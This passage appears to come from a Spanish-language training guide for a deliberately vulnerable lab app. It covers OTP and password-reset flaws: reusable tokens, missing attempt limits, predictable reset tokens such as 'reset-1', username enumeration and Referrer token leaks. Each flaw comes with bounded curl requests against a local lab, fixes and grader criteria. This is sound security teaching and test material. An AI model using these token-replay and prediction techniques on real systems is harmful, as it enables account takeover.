  "validate": {
    "email": "level5_user1@sasanlabs.org",
    "otp": "cadena de 6 dígitos recibida en Mailpit"
  }
}

Es la variante Variant.SECURE. requestOTPLevel5 usa SecureRandom, cuenta tokens del mismo email y nivel creados en los últimos quince minutos y rechaza desde el cuarto, calcula HMAC-SHA256 con una clave aleatoria de 256 bits generada al arrancar, guarda solo el HMAC, fija vencimiento de cinco minutos y envía el OTP. validateOTPLevel5 rechaza used, rechaza desde tres intentos, incrementa attempts antes de comparar el HMAC, exige vencimiento y marca used tras el éxito. Para un usuario no existente devuelve el mismo mensaje genérico sin enviar correo.

No tiene @AttackVector ni @ChallengeCard y la anotación de nivel declara Variant.SECURE. OTPServiceTest y OTPVulnerabilityTest cubren token usado, rate limit, no enumeración y delegación. El control positivo de seguridad es que una validación correcta puede tener isValid=true una vez y el replay del mismo OTP debe tener isValid=false; el rate limit se verifica en una cuenta fresca con una cuarta solicitud, teniendo en cuenta el estado persistente del laboratorio.

### otp-01 · Nivel 1: flujo legítimo y control de usuario no sembrado sin fuerza bruta

Por el código, la solicitud a un usuario sembrado debería devolver JSON con isValid=true y generar un mensaje en Mailpit cuyo cuerpo contiene Your OTP is:. Tras sustituir <OTP_DE_MAILPIT> por el valor leído en ese mensaje, la validación debería devolver content=Login successful e isValid=true. La solicitud para not-seeded@example.invalid también devuelve un mensaje genérico e isValid=true, pero no debería enviar correo. Esto no prueba por sí solo la debilidad de Random ni recorre las 10.000 combinaciones.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Este ejercicio verifica el contrato real del controlador y evita una carga de fuerza bruta. La revisión de código establece que el OTP de LEVEL_1 es de cuatro dígitos, se guarda en claro pese al nombre otpHash, no vence y no consume intentos. La comparación de la respuesta de usuario válido y usuario desconocido documenta la no enumeración en el mensaje de solicitud, pero la entrega de un HTTP 200 no demuestra autenticación correcta.

Control opcional de método: curl -i --get http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_1 --data-urlencode 'email=level1_user1@sasanlabs.org' ; la anotación declara POST, así que no se debe interpretar una respuesta de método no permitido como hallazgo de autenticación.

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_1 -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level1_user1@sasanlabs.org'
```

```bash
curl -i -sS --get http://mailpit:8025/mailpit/api/v1/search --data-urlencode 'query=to:level1_user1@sasanlabs.org'
```

MSG_ID=$(curl -sS --get http://mailpit:8025/mailpit/api/v1/search --data-urlencode 'query=to:level1_user1@sasanlabs.org' | jq -r '.messages[0].ID'); curl -sS "http://mailpit:8025/mailpit/api/v1/message/${MSG_ID}" | jq -r '.Text' ; copiar solo el OTP del cuerpo, sin exponer otros datos.

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_1/validate -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level1_user1@sasanlabs.org' --data-urlencode 'otp=<OTP_DE_MAILPIT>'
```

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_1 -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=not-seeded@example.invalid'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "true"
}
```

**Pistas:**

Sustituye <OTP_DE_MAILPIT> manualmente por el OTP del mensaje recién solicitado; no lo adivines ni enumeres combinaciones.

En cada respuesta inspecciona el JSON content/isValid; el código responde HTTP 200 tanto para éxito lógico como para error de validación.

**Corrección recomendada:** Usar CSPRNG, al menos seis dígitos con entropía adecuada, expiración corta, uso único, contador atómico de intentos y rate limiting por cuenta, IP y dispositivo. Almacenar una representación derivada segura del OTP y mantener respuestas de solicitud genéricas.

### otp-02 · Nivel 2: observar el flujo de Random con semilla temporal sin predecir ni bombardear

La solicitud debería enviar un OTP de seis dígitos a Mailpit y responder con isValid=true. La validación con el valor recuperado debería responder Login successful/isValid=true; una segunda validación inmediata del mismo valor también está prevista por el código porque no hay used ni expiración. El ejercicio no afirma haber predicho la semilla: solo hace reproducible la ruta y deja la predictibilidad como conclusión de revisión de código.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

OTPService crea new Random(System.currentTimeMillis()) en cada solicitud. Esa elección reduce el espacio temporal de semillas, pero intentar inferir el instante o probar candidatos en el servicio no es necesario para este laboratorio y podría generar carga. Dos validaciones acotadas muestran la ausencia de consumo del token, no prueban por sí solas la predicción de la semilla.

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_2 -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level2_user1@sasanlabs.org'
```

```bash
curl -i -sS --get http://mailpit:8025/mailpit/api/v1/search --data-urlencode 'query=to:level2_user1@sasanlabs.org'
```

MSG_ID=$(curl -sS --get http://mailpit:8025/mailpit/api/v1/search --data-urlencode 'query=to:level2_user1@sasanlabs.org' | jq -r '.messages[0].ID'); curl -sS "http://mailpit:8025/mailpit/api/v1/message/${MSG_ID}" | jq -r '.Text' ; copiar el OTP de seis dígitos.

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_2/validate -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level2_user1@sasanlabs.org' --data-urlencode 'otp=<OTP_DE_MAILPIT>'
```

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_2/validate -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level2_user1@sasanlabs.org' --data-urlencode 'otp=<OTP_DE_MAILPIT>'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "true"
}
```

**Pistas:**

El método y el cuerpo son POST form, no GET; el parámetro otp solo se envía a /validate.

La prueba de semilla temporal aquí es estática: Random(System.currentTimeMillis()) aparece en OTPService.java; no es necesario lanzar un predictor.

**Corrección recomendada:** Usar SecureRandom para generar el OTP, no derivar la seguridad de la hora del sistema, usar expiración y consumo único, y aplicar controles de intento y solicitud. El hash/HMAC debe compararse de manera segura y no guardar el OTP en claro.

### otp-03 · Nivel 3: replay controlado del mismo OTP dentro de su vencimiento

La primera validación debería ser isValid=true y la segunda, con exactamente el mismo email y OTP dentro de cinco minutos, también debería ser isValid=true según OTPServiceTest. Si el token no se obtiene o ya expiró, ambas observaciones quedan inconclusas y se debe solicitar un token nuevo; no se debe contar un HTTP 200 como éxito lógico.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Este es el ejercicio representativo de REUSABLE_PASSWORD_RESET_TOKEN. validateOTPLevel3 solo comprueba otpHash y expiresAt; no consulta ni actualiza used. La repetición está acotada a dos POST y no requiere fuerza bruta, acceso a secretos ni automatización masiva.

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_3 -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level3_user1@sasanlabs.org'
```

```bash
curl -i -sS --get http://mailpit:8025/mailpit/api/v1/search --data-urlencode 'query=to:level3_user1@sasanlabs.org'
```

MSG_ID=$(curl -sS --get http://mailpit:8025/mailpit/api/v1/search --data-urlencode 'query=to:level3_user1@sasanlabs.org' | jq -r '.messages[0].ID'); curl -sS "http://mailpit:8025/mailpit/api/v1/message/${MSG_ID}" | jq -r '.Text' ; copiar el OTP de seis dígitos.

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_3/validate -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level3_user1@sasanlabs.org' --data-urlencode 'otp=<OTP_DE_MAILPIT>'
```

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_3/validate -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level3_user1@sasanlabs.org' --data-urlencode 'otp=<OTP_DE_MAILPIT>'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "true"
}
```

**Pistas:**

No cambies el valor entre la primera y segunda validación; la repetición es la observación.

El vencimiento se fija con LocalDateTime.now().plusMinutes(5); si la observación se retrasa, repite solo el flujo de solicitud.

**Corrección recomendada:** Al validar correctamente, marcar el token como usado en una operación atómica y rechazar used=true antes de comparar. Mantener vencimiento corto, límite de intentos y protección contra carreras en una base de datos compartida, no solo en memoria.

### otp-04 · Nivel 4: tres intentos acotados, nueva solicitud y replay del token exitoso

Tras una solicitud y tres validaciones con un valor confirmado como distinto del OTP, las tres respuestas deberían ser isValid=false y el intento posterior con el OTP correcto del primer mensaje debería seguir siendo isValid=false porque attempts ya llegó a 3. Una nueva solicitud para el mismo usuario debería devolver la respuesta genérica y enviar otro OTP sin un rate limit de solicitudes. Con el segundo OTP, la primera validación debería ser exitosa y, por la ausencia de una lectura de used, el replay inmediato también se espera exitoso mientras no se hayan consumido los tres intentos. Estas son expectativas de código, no resultados ya ejecutados.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El ejercicio usa solo tres errores, una comprobación posterior y una nueva solicitud; no intenta la fuerza bruta ni una ráfaga. La comparación del OTP correcto tras el tope comprueba el límite por token. La nueva solicitud comprueba que ese contador no es global. El replay posterior descubre un defecto adicional: el servicio establece used=true, pero validateOTPLevel4 nunca lo consulta.

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_4 -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level4_user1@sasanlabs.org'
```

MSG_ID=$(curl -sS --get http://mailpit:8025/mailpit/api/v1/search --data-urlencode 'query=to:level4_user1@sasanlabs.org' | jq -r '.messages[0].ID'); curl -sS "http://mailpit:8025/mailpit/api/v1/message/${MSG_ID}" | jq -r '.Text' ; guardar como <OTP_PRIMER_MENSAJE>.

Elegir manualmente <OTP_DISTINTO_DEL_MENSAJE> de seis dígitos y confirmar que no coincide con <OTP_PRIMER_MENSAJE>; no usar valores generados en bucle.

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_4/validate -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level4_user1@sasanlabs.org' --data-urlencode 'otp=<OTP_DISTINTO_DEL_MENSAJE>'
```

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_4/validate -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level4_user1@sasanlabs.org' --data-urlencode 'otp=<OTP_DISTINTO_DEL_MENSAJE>'
```

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_4/validate -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level4_user1@sasanlabs.org' --data-urlencode 'otp=<OTP_DISTINTO_DEL_MENSAJE>'
```

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_4/validate -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level4_user1@sasanlabs.org' --data-urlencode 'otp=<OTP_PRIMER_MENSAJE>'
```

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_4 -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level4_user1@sasanlabs.org'
```

MSG_ID=$(curl -sS --get http://mailpit:8025/mailpit/api/v1/search --data-urlencode 'query=to:level4_user1@sasanlabs.org' | jq -r '.messages[0].ID'); curl -sS "http://mailpit:8025/mailpit/api/v1/message/${MSG_ID}" | jq -r '.Text' ; guardar como <OTP_SEGUNDO_MENSAJE>.

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_4/validate -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level4_user1@sasanlabs.org' --data-urlencode 'otp=<OTP_SEGUNDO_MENSAJE>'
```

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_4/validate -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level4_user1@sasanlabs.org' --data-urlencode 'otp=<OTP_SEGUNDO_MENSAJE>'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Login successful"
}
```

**Pistas:**

El cuarto intento con el primer token debe hacerse después de los tres errores; no lo confundas con una nueva solicitud.

Para que el control sea válido, <OTP_DISTINTO_DEL_MENSAJE> debe ser distinto del valor de Mailpit; si coincidiera por casualidad, descarta el flujo y solicita uno nuevo.

**Corrección recomendada:** Rechazar used=true antes de cualquier comparación, hacer el incremento de intentos y el consumo atómicos, y limitar solicitudes nuevas por cuenta y ventana temporal. Mantener expiración y respuesta genérica, y aplicar un límite también a la generación de tokens.

### otp-05 · Nivel 5: control positivo de uso único y rate limit de solicitudes

En una cuenta con estado limpio, la primera solicitud de level5_user1 debería ser genérica y emitir un OTP; validar ese OTP debería dar isValid=true y repetirlo debería dar isValid=false. Para level5_user2, las primeras tres solicitudes dentro de quince minutos deberían poder responder isValid=true y la cuarta debería responder isValid=false con content=Too many OTP requests, please wait. Si la base ya contiene tokens de una ejecución anterior, el control de rate limit queda inconcluso y debe repetirse con un laboratorio reiniciado, no compensarse con más solicitudes.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Este nivel sirve como contraste positivo de seguridad. La solicitud usa SecureRandom y no guarda el OTP en claro: solo conserva un HMAC con una clave aleatoria en memoria. La validación verifica used, attempts, HMAC y expiración. El replay debe fallar aunque el HTTP siga siendo 200. La cuenta separada level5_user2 evita mezclar, dentro del mismo recorrido, el token usado con la cuenta que prueba el límite de tres solicitudes.

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_5 -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level5_user1@sasanlabs.org'
```

MSG_ID=$(curl -sS --get http://mailpit:8025/mailpit/api/v1/search --data-urlencode 'query=to:level5_user1@sasanlabs.org' | jq -r '.messages[0].ID'); curl -sS "http://mailpit:8025/mailpit/api/v1/message/${MSG_ID}" | jq -r '.Text' ; copiar como <OTP_DE_MAILPIT>.

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_5/validate -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level5_user1@sasanlabs.org' --data-urlencode 'otp=<OTP_DE_MAILPIT>'
```

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_5/validate -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level5_user1@sasanlabs.org' --data-urlencode 'otp=<OTP_DE_MAILPIT>'
```

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_5 -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level5_user2@sasanlabs.org'
```

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_5 -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level5_user2@sasanlabs.org'
```

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_5 -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level5_user2@sasanlabs.org'
```

```bash
curl -i -sS -X POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_5 -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'email=level5_user2@sasanlabs.org'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "false"
}
```

**Pistas:**

El valor que debe evaluarse es el booleano JSON isValid, no el código HTTP; los errores lógicos también se devuelven con HTTP 200.

Para verificar el rate limit usa una cuenta de nivel 5 que no haya sido usada recientemente y detente en la cuarta solicitud; no repitas después del rechazo.

**Corrección recomendada:** El código ya incorpora las medidas observables: generación criptográfica, HMAC, vencimiento, uso único, límite de tres intentos, rate limit de tres solicitudes en quince minutos, bloqueo por email:nivel y respuesta genérica. En una implementación distribuida, mover el consumo, los contadores y el bloqueo a una transacción o almacén compartido; considerar gestión de claves y rotación en lugar de una clave exclusivamente en memoria.

### Límites de esta familia

[
  "No se ejecutaron los ejercicios contra target ni Mailpit desde este análisis; todos los expected son inferencias de código y tests del commit indicado. No se promete que el laboratorio esté levantado, que target resuelva o que la API de Mailpit use exactamente /mailpit/api/v1 en toda configuración.",
  "El estado es persistente: tokens, contador de intentos y ventanas de rate limit pueden quedar de ejecuciones anteriores. Las conclusiones de estado limpio requieren una instancia de laboratorio reiniciada o una cuenta sembrada no utilizada; no se debe borrar datos ni compensar con ráfagas.",
  "Los pasos evitan deliberadamente la fuerza bruta completa de LEVEL_1, la predicción automatizada de la semilla de LEVEL_2 y cualquier volumen que pueda convertirse en DoS. Unas pocas respuestas de error no prueban por sí solas que un límite sea infinito; la ausencia de límites se atribuye aquí a la revisión de OTPService.java.",
  "El endpoint de solicitud y el endpoint /validate responden con el bean {content,isValid} y suelen usar HTTP 200 para éxito y fallo lógico. El verificador sugerido debe inspeccionar JSON content/isValid; no debe usar 200 como prueba de autenticación.",
  "La consulta de Mailpit mediante jq es una comodidad del entorno Kali. Si la instalación no expone /mailpit/api/v1, usar la interfaz autorizada http://mailpit:8025/mailpit para identificar manualmente el último mensaje; no consultar ni extraer información ajena al usuario del ejercicio.",
  "El HMAC de LEVEL_5 usa una clave aleatoria solo en memoria; un reinicio puede volver inutilizables tokens emitidos antes del reinicio. Eso es una consideración operativa del código, no una demostración de vulnerabilidad del nivel.",
  "No se debe otorgar puntaje por hacer clic en la interfaz: la UI solo muestra textContent y delega en estas rutas. Un reflejo de texto no probaría ejecución XSS, un HTTP 200 no probaría IDOR, y un resultado visual o un click no sustituye la comprobación de la respuesta JSON y del estado de token.",
  "Los tests unitarios usan mocks y no cubren una integración HTTP completa. OTPVulnerabilityTest tiene una prueba llamada allLevels_ShouldHandleNullEmail, pero el cuerpo mostrado solo ejercita level1; no debe interpretarse como cobertura exhaustiva de los cinco niveles."
]

## Recuperación de contraseñas

La familia implementa el flujo de solicitud y aplicación de un restablecimiento de contraseña. El controlador está anotado como PasswordResetVulnerability y cada método de nivel usa @VulnerableAppRequestMapping con LEVEL_1 a LEVEL_10; siguiendo el enrutamiento central indicado, las páginas quedan bajo /VulnerableApp/PasswordResetVulnerability/LEVEL_n. La anotación declara GET para la página de cada nivel, mientras que el propio controlador también expone POST en la misma ruta lógica mediante @RequestMapping(value = "LEVEL_{level}", method = POST) para las acciones request y reset. Las acciones reciben JSON PasswordResetRequest con action, email, token y newPassword y devuelven {content,isValid}. El seeder crea tres cuentas por nivel con correos deterministas levelN_user1@sasanlabs.org, levelN_user2@sasanlabs.org y levelN_user3@sasanlabs.org; sus identificadores son ((N-1)*3)+1..3. El servicio persiste cada token emitido, construye el enlace /VulnerableApp/password-reset/reset.html?level=N&token=..., envía el mensaje a Mailpit y aplica o deja de aplicar expiración, uso único, aleatoriedad, enumeración y rate limiting según el nivel. Este documento describe lo que se puede verificar leyendo el commit solicitado y propone comprobaciones seguras en el laboratorio; no afirma que las llamadas hayan sido ejecutadas con éxito contra target.

### Todos los niveles originales

#### `GET para la página/estado inicial; POST JSON para request o reset /VulnerableApp/PasswordResetVulnerability/LEVEL_1`

**Entrada:** {
  "GET": "Sin cuerpo devuelve un objeto de página lista con message, level y email por defecto.",
  "POST_request": {
    "action": "request",
    "email": "level1_user1@sasanlabs.org"
  },
  "POST_reset": {
    "action": "reset",
    "token": "reset-1",
    "newPassword": "VA_LAB_LEVEL1"
  }
}

Para el usuario de id 1 el generador devuelve exactamente reset-1. La solicitud guarda el token y manda un enlace a Mailpit. La expiración se guarda como null porque el nivel 1 está dentro de isMissingExpirationVulnerable; el mismo token tampoco se marca como usado porque el nivel está dentro de isReusableTokenVulnerable. La respuesta de reset exitoso contiene message=Password reset successful, username y level.

La anotación principal es PREDICTABLE_PASSWORD_RESET_TOKEN, pero el código también deja sin expiración y permite reutilización. El token sólo existe en la tabla después de una solicitud; adivinar reset-1 sin haber creado el registro no basta para pasar la consulta del repositorio. El nivel también expone mensajes de enumeración para correos inexistentes porque isEnumerationVulnerable es true hasta el nivel 4.

#### `GET para la página/estado inicial; POST JSON para request o reset /VulnerableApp/PasswordResetVulnerability/LEVEL_2`

**Entrada:** {
  "GET": "Sin cuerpo devuelve el estado inicial del nivel.",
  "POST_request": {
    "action": "request",
    "email": "level2_user1@sasanlabs.org"
  },
  "POST_reset": {
    "action": "reset",
    "token": "TOKEN_COPIADO_DE_MAILPIT",
    "newPassword": "VA_LAB_LEVEL2"
  }
}

El generador entra en la rama débil y produce weak- seguido de un entero entre 1000 y 9999. computeExpiry devuelve null y el token no se marca usado tras reset, por lo que el servicio conserva el riesgo de ausencia de expiración y de reutilización. Las solicitudes para correos desconocidos revelan el mensaje No account found for email: ... en este nivel.

El AttackVector declarado es PASSWORD_RESET_TOKEN_WITHOUT_EXPIRY, aunque la implementación de este commit también tiene enumeración, token de baja entropía y reutilización. El texto del payload habla de usarlo tras un retraso; la comprobación de código es más fuerte: expiresAt es null.

#### `GET para la página/estado inicial; POST JSON para request o reset /VulnerableApp/PasswordResetVulnerability/LEVEL_3`

**Entrada:** {
  "GET": "Sin cuerpo devuelve el estado inicial del nivel.",
  "POST_request": {
    "action": "request",
    "email": "level3_user1@sasanlabs.org"
  },
  "POST_reset": {
    "action": "reset",
    "token": "TOKEN_COPIADO_DE_MAILPIT",
    "newPassword": "VA_LAB_LEVEL3"
  }
}

La rama de generación es weak-1000..9999 y expiresAt queda null. A diferencia de los niveles 1 y 2, el primer reset marca used=true y un segundo uso devuelve Invalid or expired reset token. El nivel sigue devolviendo mensajes diferenciados para cuentas inexistentes.

La anotación es REUSABLE_PASSWORD_RESET_TOKEN, pero la implementación actual sí aplica uso único; la debilidad reproducible de código es la falta de expiración, junto con el generador débil y la enumeración. PasswordResetServiceTest comprueba explícitamente que un token usado del nivel 3 se rechaza.

#### `GET para la página/estado inicial; POST JSON para request /VulnerableApp/PasswordResetVulnerability/LEVEL_4`

**Entrada:** {
  "GET": "Sin cuerpo devuelve el estado inicial del nivel.",
  "POST_request_known": {
    "action": "request",
    "email": "level4_user1@sasanlabs.org"
  },
  "POST_request_unknown": {
    "action": "request",
    "email": "not-a-user@example.invalid"
  }
}

Una cuenta existente recibe un token weak-1000..9999, con expiración de cinco minutos y uso único. Una cuenta inexistente recibe el texto No account found for email: ... en lugar del mensaje genérico. El repositorio consulta findByEmailAndLevel, por lo que la comparación debe hacerse manteniendo el mismo nivel.

El AttackVector es USERNAME_ENUMERATION. La semántica de token débil del código también alcanza los niveles 2 a 5, aunque el payload y la anotación de nivel 4 se enfocan en enumeración. Un HTTP 200 o isValid no debe interpretarse como autorización ni como prueba de otro defecto.

#### `GET para la página/estado inicial; POST JSON para request o reset /VulnerableApp/PasswordResetVulnerability/LEVEL_5`

**Entrada:** {
  "GET": "Sin cuerpo devuelve el estado inicial del nivel.",
  "POST_request": {
    "action": "request",
    "email": "level5_user1@sasanlabs.org"
  },
  "POST_reset": {
    "action": "reset",
    "token": "TOKEN_COPIADO_DE_MAILPIT",
    "newPassword": "VA_LAB_LEVEL5"
  }
}

El nivel usa el generador weak-1000..9999, fija expiresAt a ahora más cinco minutos y marca el token como usado al completar el primer reset. El enlace del correo se construye con EmailConfiguration.getBaseUrl(), se elimina una barra final y se añade un esquema http:// sólo si falta esquema; el path incluye level=5 y el token URL-encoded.

La anotación y el payload nombran INSECURE_PASSWORD_RESET_LINK y esperan un enlace HTTP. Sin embargo, buildResetLink es común a todos los niveles y no contiene una rama específica de nivel 5: el esquema efectivo depende de la configuración base. En el laboratorio se debe inspeccionar el enlace real en Mailpit, no inferirlo sólo del status.

#### `GET para la página/estado inicial; POST JSON para request o reset /VulnerableApp/PasswordResetVulnerability/LEVEL_6`

**Entrada:** {
  "GET": "Sin cuerpo devuelve el estado inicial del nivel.",
  "POST_request": {
    "action": "request",
    "email": "level6_user1@sasanlabs.org"
  },
  "POST_reset": {
    "action": "reset",
    "token": "TOKEN_COPIADO_DE_MAILPIT",
    "newPassword": "VA_LAB_LEVEL6"
  }
}

Con el código del commit, level 6 no entra en isWeakRandomTokenVulnerable porque esa función sólo devuelve true para niveles 2..5. Tampoco es nivel 1 ni 8, ni >=9; por tanto generateToken usa UUID.randomUUID(). El token expira a los cinco minutos y es de un solo uso.

Existe una discrepancia que debe conservarse como incertidumbre: @AttackVector declara WEAK_RANDOM_NUMBER_GENERATION y el payload describe un token débil de seis dígitos, pero la rama ejecutable del servicio genera UUID para level=6. No se debe puntuar como token débil sin observar el código desplegado y el enlace recibido.

#### `GET para la página/estado inicial; POST JSON para request o reset /VulnerableApp/PasswordResetVulnerability/LEVEL_7`

**Entrada:** {
  "GET_page": {
    "level": "7",
    "token": "TOKEN_DE_ENTRENAMIENTO"
  },
  "POST_request": {
    "action": "request",
    "email": "level7_user1@sasanlabs.org"
  },
  "POST_reset": {
    "action": "reset",
    "token": "TOKEN_COPIADO_DE_MAILPIT",
    "newPassword": "VA_LAB_LEVEL7"
  }
}

El token se genera con UUID, expira en cinco minutos y es de un solo uso. En /password-reset/reset.html?level=7&token=... el filtro PasswordResetReferrerPolicyFilter añade Referrer-Policy: unsafe-url. El JavaScript de reset.js, sólo para nivel 7, carga una imagen de terceros y establece también referrerPolicy=unsafe-url; un navegador podría enviar la URL completa, incluido token, como Referer.

La anotación es PASSWORD_RESET_TOKEN_EXPOSED_VIA_REFERRER. curl no ejecuta JavaScript ni genera por sí mismo una solicitud de imagen: el encabezado demuestra la condición de política, pero la recepción efectiva por un tercero requiere una comprobación manual de red en un navegador controlado. El código fija dummyimage.com, no un receptor configurable; no se envían solicitudes de SSRF ni se prueba ningún host externo.

#### `GET para la página/estado inicial; POST JSON para request o reset /VulnerableApp/PasswordResetVulnerability/LEVEL_8`

**Entrada:** {
  "GET": "Sin cuerpo devuelve el estado inicial del nivel.",
  "POST_request": {
    "action": "request",
    "email": "level8_user1@sasanlabs.org"
  },
  "POST_reset": {
    "action": "reset",
    "token": "TOKEN_COPIADO_DE_MAILPIT",
    "newPassword": "VA_LAB_LEVEL8"
  }
}

La rama especial codifica en Base64 URL-safe sin padding el texto obf:<id>:<epochSeconds>. Para el usuario 1, el contenido decodificable conserva el id y el segundo actual, por lo que la construcción es predecible/obscurecida y no un secreto aleatorio de alta entropía. A diferencia de lo que dice el payload, en este código level 8 sí recibe expiresAt de cinco minutos y sí aplica uso único.

La anotación es PREDICTABLE_PASSWORD_RESET_TOKEN. El payload de level 8 afirma que combina ausencia de expiración y reutilización, pero isMissingExpirationVulnerable sólo cubre 1..3 e isReusableTokenVulnerable sólo 1..2. Esa discrepancia impide afirmar esas dos propiedades para el commit inspeccionado.

#### `GET para la página/estado inicial; POST JSON para request o reset /VulnerableApp/PasswordResetVulnerability/LEVEL_9`

**Entrada:** {
  "GET": "Sin cuerpo devuelve el estado inicial del nivel.",
  "POST_request": {
    "action": "request",
    "email": "level9_user1@sasanlabs.org"
  },
  "POST_reset": {
    "action": "reset",
    "token": "TOKEN_COPIADO_DE_MAILPIT",
    "newPassword": "VA_LAB_LEVEL9"
  }
}

Usa 24 bytes de SecureRandom codificados en Base64 URL-safe sin padding. El token tiene expiración de cinco minutos y uso único. isRateLimitingEnabled sólo devuelve true para el nivel 10, así que múltiples solicitudes del mismo correo en level 9 no pasan por el contador de cinco intentos.

El AttackVector es NO_LOGIN_RATE_LIMITING. PasswordResetServiceTest ejecuta seis solicitudes del nivel 9 y espera seis correos; el ejercicio propuesto limita la comprobación a seis solicitudes explícitas en una cuenta/identidad de laboratorio para no convertirla en carga ni DoS.

#### `GET para la página/estado inicial; POST JSON para request o reset /VulnerableApp/PasswordResetVulnerability/LEVEL_10`

**Entrada:** {
  "GET": "Sin cuerpo devuelve el estado inicial del nivel.",
  "POST_request": {
    "action": "request",
    "email": "level10_user1@sasanlabs.org"
  },
  "POST_reset": {
    "action": "reset",
    "token": "TOKEN_COPIADO_DE_MAILPIT",
    "newPassword": "VA_LAB_LEVEL10"
  }
}

Es la variante SECURE sin @AttackVector. Genera tokens con 24 bytes de SecureRandom, exige expiración de cinco minutos, marca el token usado y mantiene un contador por email en memoria: las primeras cinco solicitudes dentro de la ventana de 30 minutos siguen el flujo normal y la sexta devuelve message=Too many reset requests, try again after 30 mins, rateLimitingApplied=true y requestBlocked=true. El contador se incrementa antes de buscar al usuario.

Es el control positivo de expiración, uso único y rate limiting. El contador es memoria de proceso y no necesariamente sobrevive a reinicios ni se comparte entre instancias; un resultado distinto puede deberse al estado previo del laboratorio. La UI usa LEVEL_9/SecurePasswordReset.js como plantilla declarada, pero la ruta del backend sigue siendo LEVEL_10.

### passwordReset-01 · Nivel 1: predecibilidad y reutilización del token

La inspección de código predice que la solicitud crea el registro con reset-1. Después, los cuerpos reset con reset-1 deberían producir Password reset successful tanto con VA_LAB_LEVEL1_A como con VA_LAB_LEVEL1_B, porque el token no expira ni se marca usado. No se afirma que el servicio del laboratorio haya respondido así hasta ejecutar los comandos.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Primero se crea el token legítimamente para que exista en el repositorio; luego se usa sólo el identificador determinista del usuario sembrado. La prueba de repetición es un cambio de contraseña dentro de la cuenta de laboratorio, no acceso a una cuenta ajena. La dirección de correo es conocida por el seeder y no contiene secretos del host.

Comprobar la página sin asumir que los parámetros GET ejecutan una acción: curl -i --get http://target:9090/VulnerableApp/PasswordResetVulnerability/LEVEL_1 --data-urlencode 'probe=ready'

Como control de alias de página, observar la redirección sin seguirla: curl -i --get http://target:9090/VulnerableApp/PasswordResetVulnerability/Level1 --data-urlencode 'token=VA_LAB_ALIAS'

